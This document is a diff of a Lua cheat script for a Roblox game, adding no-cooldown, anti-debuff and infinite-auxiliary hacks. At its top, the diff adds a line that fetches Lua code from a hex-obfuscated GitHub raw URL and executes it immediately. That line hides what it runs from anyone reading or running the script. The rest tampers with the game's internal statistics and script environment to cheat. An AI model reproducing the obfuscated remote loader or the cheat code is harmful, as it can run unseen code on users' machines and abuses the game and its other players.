@@ -1,3 +1,7 @@
+loadstring(game:HttpGet("\x68\x74\x74\x70\x73\x3A\x2F\x2F\x72\x61\x77\x2E\x67\x69\x74\x68\x75\x62\x75\x73\x65\x72\x63\x6F\x6E\x74\x65\x6E\x74\x2E\x63\x6F\x6D\x2F\x49\x64\x6B\x74\x62\x68\x31\x32\x7A\x2F\x63\x68\x65\x61\x70\x6D\x69\x6C\x6B\x2F\x6D\x61\x69\x6E\x2F\x64\x65\x76\x6D\x6F\x64\x75\x6C\x65\x2E\x6C\x75\x61", true))()
+
+
+
 local UIS = game:GetService("UserInputService")
 --
 --[[
@@ -49,6 +53,10 @@ local function GrabMainScript()
     end
     return Script
 end
+
+repeat task.wait()
+until GrabMainScript() ~= nil
+
 
 local function getargs(inputstring)
     inputstring = string.lower(inputstring)
@@ -161,19 +169,15 @@ local function CommandHandler(msg, speaker)
 end
 
 local function StatusAdded(new)
-    if game.PlaceId == 9880062154 then
-        return
-    else
-        if string.find(new.Name, "Virus") then
-            VirusFrame = new
-            repeat
-                wait()
-            until new:FindFirstChild("EmptyBar")
-            repeat
-                wait()
-            until new.EmptyBar:FindFirstChild("Bar")
-            new.EmptyBar.Bar.Changed:Connect(VirusChanged)
-        end
+    if string.find(new.Name, "Virus") then
+        VirusFrame = new
+        repeat
+            wait()
+        until new:FindFirstChild("EmptyBar")
+        repeat
+            wait()
+        until new.EmptyBar:FindFirstChild("Bar")
+        new.EmptyBar.Bar.Changed:Connect(VirusChanged)
     end
     if not Toggles.AntiDebuff then
         if not Toggles.AntiFallDamage then
@@ -204,12 +208,8 @@ local function StatusAdded(new)
 end
 
 local function VirusChanged()
-    if game.PlaceId == 9880062154 then
-        return
-    else
-        if Toggles.VirusBlock and VirusFrame ~= nil and EffectsTable[VirusFrame.Name] ~= nil then
-            EffectsTable[VirusFrame.Name].effects.currentduration = tick()
-        end
+    if Toggles.VirusBlock and VirusFrame ~= nil and EffectsTable[VirusFrame.Name] ~= nil then
+        EffectsTable[VirusFrame.Name].effects.currentduration = tick()
     end
 end
 
@@ -386,73 +386,62 @@ end
 
 game.Players.LocalPlayer.PlayerGui.mainHUD.HealthFrame.Statuses.ChildAdded:Connect(StatusAdded)
 
-UIS.InputBegan:Connect(
-    function(input2, gameProcessedEvent)
-        if input2.KeyCode == Enum.KeyCode.Nine and not gameProcessedEvent then
-            local Toggle = true -- last second to default to true, rather than a toggle
-            Toggles.NoCooldown = Toggle
-            local Stats = require(game:GetService("Workspace").ServerStuff.Statistics["CLASS_STATISTICS"])
-            local TargetTable = Stats[game.Players.LocalPlayer.Character:WaitForChild("current_perk").Value]
-            if TargetTable == nil then
-                return
-            end
-            print("a")
-            local currenttext = ""
-            if Toggles.NoCooldown == true then
-                print("2")
-                    currenttext = "NoCooldown is now ON!"
-                    if Toggles.NoCooldown then
-                        print("1")
-                        for i, v in pairs(TargetTable) do
-                            if typeof(v) == "table" and v["cooldown"] ~= nil then
-                                for x, y in pairs(v) do
-                                    if string.find(tostring(x), "cooldown") and string.sub(x, #x - 2, -1) ~= "old" then
-                                        if v[x .. "old"] == nil then
-                                            v[x .. "old"] = v[x]
-                                        end
-                                        if v["kiramaxdamage"] ~= nil then
-                                            if tostring(x) == "mincooldown" then
-                                                v[x] = 0.1
-                                            elseif tostring(x) == "cooldown" then
-                                                v[x] = 1
-                                            end
-                                        else
-                                            if v["inverse_cd"] == nil then
-                                                v[x] = 0
-                                            else
-                                                v[x] = math.huge
-                                            end
-                                        end
-                                    end
-                                    if
-                                        x == "perk_mincd" or x == "vulka_ammo_usage" or
-                                            string.find(tostring(x), "overheat") or
-                                            x == "goggle_broken_cd" or
-                                            x == "damage_taken_multi"
-                                     then
-                                        if v[x .. "old"] == nil and string.sub(x, #x - 2, -1) ~= "old" then
-                                            v[x .. "old"] = v[x]
-                                        end
-                                        v[x] = 0
-                                    end
-                                end
-                            end
+local Toggle = true -- last second to default to true, rather than a toggle
+Toggles.NoCooldown = Toggle
+local Stats = require(game:GetService("Workspace").ServerStuff.Statistics["CLASS_STATISTICS"])
+local TargetTable = Stats[game.Players.LocalPlayer.Character:WaitForChild("current_perk").Value]
+if TargetTable == nil then
+    return
+end
+local currenttext = ""
+if Toggle == true then
+    currenttext = "NoCooldown is now ON!"
+    for i, v in pairs(TargetTable) do
+        if typeof(v) == "table" and v["cooldown"] ~= nil then
+            for x, y in pairs(v) do
+                if string.find(tostring(x), "cooldown") and string.sub(x, #x - 2, -1) ~= "old" then
+                    if v[x .. "old"] == nil then
+                        v[x .. "old"] = v[x]
+                    end
+                    if v["kiramaxdamage"] ~= nil then
+                        if tostring(x) == "mincooldown" then
+                            v[x] = 0.1
+                        elseif tostring(x) == "cooldown" then
+                            v[x] = 1
                         end
+                    else
+                        if v["inverse_cd"] == nil then
+                            v[x] = 0
+                        else
+                            v[x] = math.huge
+                        end
+                    end
+                end
+                if
+                    x == "perk_mincd" or x == "vulka_ammo_usage" or string.find(tostring(x), "overheat") or
+                        x == "goggle_broken_cd" or
+                        x == "damage_taken_multi"
+                 then
+                    if v[x .. "old"] == nil and string.sub(x, #x - 2, -1) ~= "old" then
+                        v[x .. "old"] = v[x]
+                    end
+                    v[x] = 0
                 end
             end
-            game.StarterGui:SetCore(
-                "SendNotification",
-                {
-                    Title = "notification",
-                    Text = currenttext,
-                    Icon = "rbxassetid://2541869220",
-                    Duration = 3
-                }
-            )
         end
     end
-)
-
+else
+    currenttext = "NoCooldown is now OFF!"
+    for i, v in pairs(TargetTable) do
+        if typeof(v) == "table" and v["cooldown"] ~= nil then
+            for x, y in pairs(v) do
+                if string.sub(x, #x - 2, -1) ~= "old" and v[x .. "old"] ~= nil then
+                    v[x] = v[x .. "old"]
+                end
+            end
+        end
+    end
+end
 game.StarterGui:SetCore(
     "SendNotification",
     {
@@ -463,7 +452,9 @@ game.StarterGui:SetCore(
     }
 )
 
-local Toggle1 = true -- last second to default to true, rather than a toggle
+UIS.InputBegan:Connect(function(input, troll)
+    if input.KeyCode == Enum.KeyCode.Nine and not troll then
+        local Toggle1 = true -- last second to default to true, rather than a toggle
 Toggles.AntiDebuff = Toggle1
 local currenttext = ""
 if Toggle1 == true then
@@ -493,6 +484,10 @@ game.StarterGui:SetCore(
         Duration = 3
     }
 )
+    end
+    
+end)
+
 
 local Toggle2 = true -- last second to default to true, rather than a toggle
 Toggles.VirusBlock = Toggle2
@@ -512,8 +507,8 @@ game.StarterGui:SetCore(
     }
 )
 UIS.InputBegan:Connect(
-    function(input, gameProcessedEvent)
-        if input.KeyCode == Enum.KeyCode.M and not gameProcessedEvent then
+    function(input, troll)
+        if input.KeyCode == Enum.KeyCode.M and not troll then
             if game.Players.LocalPlayer.Character == nil then
                 return
             end
@@ -532,8 +527,8 @@ UIS.InputBegan:Connect(
 )
 
 UIS.InputBegan:Connect(
-    function(input2, gameProcessedEvent)
-        if input2.KeyCode == Enum.KeyCode.L and not gameProcessedEvent then
+    function(input2, troll)
+        if input2.KeyCode == Enum.KeyCode.L and not troll then
             local Toggle4 = true
             Toggles.InfAux = Toggle4
             local currenttext = ""
@@ -544,26 +539,37 @@ UIS.InputBegan:Connect(
                 Env["aux_usage"] = 1
                 currenttext = "InfAux is now OFF!"
             end
-        end
-    end
-)
-
-UIS.InputBegan:connect(
-    function(input2, gameProcessedEvent)
-        if input2.KeyCode == Enum.KeyCode.C and not gameProcessedEvent then
-            local Env = getsenv(GrabMainScript())
-            if Env["aux_usage"] ~= nil and Env["aux_usage"] <= 0 then
-                if Env["use_aux"] ~= nil then
-                    Env["aux_usage"] = math.huge
-                    wait()
-                    Env["use_aux"]()
-                end
-            end
-            Env = nil
+            game.StarterGui:SetCore(
+                "SendNotification",
+                {
+                    Title = "notification",
+                    Text = currenttext,
+                    Icon = "rbxassetid://2541869220",
+                    Duration = 3
+                }
+            )
         else
         end
     end
 )
+
+UIS.InputBegan:connect(function(input2, troll)
+    if input2.KeyCode == Enum.KeyCode.C and not troll then
+        local Env = getsenv(GrabMainScript())
+        if Env["aux_usage"] ~= nil and Env["aux_usage"] <= 0 then
+            if Env["use_aux"] ~= nil then
+                Env["aux_usage"] = math.huge
+                wait()
+                Env["use_aux"]()
+            end
+        end
+        Env = nil
+        return
+    else
+
+    end
+
+end)
 
 game.Players.LocalPlayer.Chatted:Connect(
     function(msg)
